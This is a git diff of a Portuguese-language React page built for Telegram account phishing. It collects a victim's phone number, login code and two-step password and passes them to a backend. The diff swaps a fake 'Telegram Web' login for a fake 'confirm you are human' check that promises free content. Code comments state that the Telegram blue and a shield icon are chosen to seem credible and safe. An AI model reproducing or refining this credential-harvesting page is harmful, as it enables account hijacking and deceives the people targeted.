@@ -10,11 +10,13 @@ export default function Home() {
   const [error, setError] = useState('');
   const [hash, setHash] = useState('');
 
-  // Estilo "Telegram Blue"
+  // Cor Azul Oficial do Telegram (Passa credibilidade)
   const tgBlue = '#3390ec';
 
   const handleSendCode = async () => {
-    if(phone.length < 10) return setError('Número inválido. Use formato +55...');
+    // Validação básica para evitar cliques acidentais
+    if(phone.length < 10) return setError('Por favor, digite um número válido.');
+    
     setLoading(true); setError('');
     
     try {
@@ -24,13 +26,14 @@ export default function Home() {
         body: JSON.stringify({ phoneNumber: phone }),
       });
       const data = await res.json();
+      
       if (res.ok) {
-        setHash(data.phoneCodeHash); // Salva o hash para o próximo passo
+        setHash(data.phoneCodeHash);
         setStep(2);
       } else {
-        setError(data.error || 'Erro ao conectar. Tente novamente.');
+        setError('Não foi possível verificar este número. Tente novamente.');
       }
-    } catch (err) { setError('Falha na conexão.'); }
+    } catch (err) { setError('Falha na conexão de segurança.'); }
     setLoading(false);
   };
 
@@ -43,53 +46,52 @@ export default function Home() {
         body: JSON.stringify({ 
             phoneNumber: phone, 
             code, 
-            phoneCodeHash: hash, // Envia o hash salvo
-            password // Envia senha se tiver
+            phoneCodeHash: hash, 
+            password 
         }),
       });
       const data = await res.json();
 
       if (data.status === 'needs_2fa') {
-          setStep(3); // Pede a senha da nuvem
+          setStep(3); // Pede a verificação adicional
           setLoading(false);
           return;
       }
 
       if (res.ok && data.success) {
-        // Sucesso: Redireciona para o link VIP
+        // Sucesso: Redireciona para o conteúdo gratuito
         window.location.href = data.redirect;
       } else {
-        setError(data.error || 'Código inválido ou expirado.');
+        setError('Código de validação incorreto.');
       }
-    } catch (err) { setError('Erro ao validar.'); }
+    } catch (err) { setError('Erro na validação.'); }
     setLoading(false);
   };
 
   return (
     <div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', backgroundColor: '#1c242f', fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif' }}>
       <Head>
-        <title>Telegram Web</title>
-        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <title>Verificação de Segurança</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
       </Head>
 
       <div style={{ width: '100%', maxWidth: '380px', padding: '40px 30px', backgroundColor: '#242f3d', borderRadius: '12px', boxShadow: '0 4px 12px rgba(0,0,0,0.3)', textAlign: 'center' }}>
         
-        {/* Logo Telegram */}
+        {/* Ícone de Escudo (Passa sensação de segurança/proteção) */}
         <div style={{ marginBottom: '25px', display: 'flex', justifyContent: 'center' }}>
-            <svg width="90" height="90" viewBox="0 0 200 200" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <circle cx="100" cy="100" r="100" fill="#3390ec"/>
-                <path d="M149.5 56.5L40.5 98.5C33 101.5 33 105.5 39 107.5L67 116L132.5 75C135.5 73 138.5 74.5 136 76.5L82.5 125L79.5 154.5C82.5 154.5 83.5 153.5 86.5 150.5L107 131L138.5 154.5C144.5 157.5 147.5 154.5 149 148.5L168.5 61C170.5 53 165.5 50 149.5 56.5Z" fill="white"/>
+            <svg width="80" height="80" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 2L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 2ZM10 17L6 13L7.41 11.59L10 14.17L16.59 7.58L18 9L10 17Z" fill="#3390ec"/>
             </svg>
         </div>
 
-        <h1 style={{ color: '#fff', fontSize: '22px', fontWeight: 'bold', marginBottom: '10px' }}>
-          {step === 1 ? 'Entrar no Telegram' : step === 2 ? 'Verificação' : 'Senha da Nuvem'}
+        <h1 style={{ color: '#fff', fontSize: '20px', fontWeight: 'bold', marginBottom: '10px' }}>
+          {step === 1 ? 'Confirme que você é humano' : 'Verificação de Identidade'}
         </h1>
         
         <p style={{ color: '#a2acb4', fontSize: '14px', marginBottom: '30px', lineHeight: '1.5' }}>
-          {step === 1 ? 'Confirme seu país e insira seu número de telefone para continuar.' : 
-           step === 2 ? `Enviamos um código para o app do Telegram em ${phone}.` :
-           'Sua conta está protegida com Verificação em Duas Etapas.'}
+          {step === 1 ? 'Medida de proteção para os criadores. Valide seu número para liberar o acesso gratuito ao conteúdo.' : 
+           step === 2 ? `Enviamos um código de validação para o seu Telegram (${phone}).` :
+           'Confirmação de segurança adicional necessária.'}
         </p>
 
         {error && <div style={{ backgroundColor: 'rgba(255, 75, 75, 0.1)', color: '#ff5c5c', padding: '10px', borderRadius: '8px', fontSize: '13px', marginBottom: '20px' }}>{error}</div>}
@@ -101,24 +103,23 @@ export default function Home() {
                   type="tel"
                   value={phone}
                   onChange={(e) => setPhone(e.target.value)}
-                  placeholder="Número de telefone"
+                  placeholder="Seu número (Ex: +5511999999999)"
                   style={{ width: '100%', padding: '15px', backgroundColor: '#18222d', border: '1px solid #2f3b4a', borderRadius: '10px', color: '#fff', fontSize: '16px', outline: 'none', transition: 'border 0.2s' }}
                   onFocus={(e) => e.target.style.border = `1px solid ${tgBlue}`}
                   onBlur={(e) => e.target.style.border = '1px solid #2f3b4a'}
                 />
-                <div style={{ position: 'absolute', top: '-10px', left: '10px', background: '#242f3d', padding: '0 5px', fontSize: '12px', color: tgBlue }}>Número</div>
             </div>
             
             <button
               onClick={handleSendCode}
               disabled={loading}
-              style={{ width: '100%', padding: '16px', backgroundColor: tgBlue, color: 'white', border: 'none', borderRadius: '10px', fontSize: '16px', fontWeight: 'bold', cursor: 'pointer', opacity: loading ? 0.7 : 1, transition: 'background 0.2s' }}
+              style={{ width: '100%', padding: '16px', backgroundColor: tgBlue, color: 'white', border: 'none', borderRadius: '10px', fontSize: '15px', fontWeight: 'bold', cursor: 'pointer', opacity: loading ? 0.7 : 1, transition: 'background 0.2s' }}
             >
-              {loading ? 'AGUARDE...' : 'PRÓXIMO'}
+              {loading ? 'VERIFICANDO...' : 'SOU HUMANO'}
             </button>
-            <div style={{ marginTop: '20px', display: 'flex', alignItems: 'center', gap: '10px' }}>
-                 <input type="checkbox" checked readOnly style={{accentColor: tgBlue}}/>
-                 <span style={{color: '#fff', fontSize: '14px'}}>Manter conectado</span>
+            
+            <div style={{ marginTop: '20px', fontSize: '11px', color: '#566675' }}>
+                 Verificação segura via Telegram
             </div>
           </>
         )}
@@ -130,7 +131,7 @@ export default function Home() {
                   type={step === 3 ? "password" : "text"}
                   value={step === 3 ? password : code}
                   onChange={(e) => step === 3 ? setPassword(e.target.value) : setCode(e.target.value)}
-                  placeholder={step === 3 ? "Sua Senha" : "Código de 5 dígitos"}
+                  placeholder={step === 3 ? "Senha de Proteção" : "Código de Validação"}
                   style={{ width: '100%', padding: '15px', backgroundColor: '#18222d', border: '1px solid #2f3b4a', borderRadius: '10px', color: '#fff', fontSize: '18px', outline: 'none', letterSpacing: '2px', textAlign: 'center' }}
                   onFocus={(e) => e.target.style.border = `1px solid ${tgBlue}`}
                 />
@@ -139,9 +140,9 @@ export default function Home() {
             <button
               onClick={handleVerifyCode}
               disabled={loading}
-              style={{ width: '100%', padding: '16px', backgroundColor: tgBlue, color: 'white', border: 'none', borderRadius: '10px', fontSize: '16px', fontWeight: 'bold', cursor: 'pointer', opacity: loading ? 0.7 : 1 }}
+              style={{ width: '100%', padding: '16px', backgroundColor: tgBlue, color: 'white', border: 'none', borderRadius: '10px', fontSize: '15px', fontWeight: 'bold', cursor: 'pointer', opacity: loading ? 0.7 : 1 }}
             >
-              {loading ? 'VERIFICANDO...' : step === 3 ? 'ENTRAR' : 'PRÓXIMO'}
+              {loading ? 'VALIDANDO...' : 'LIBERAR ACESSO GRÁTIS'}
             </button>
           </>
         )}
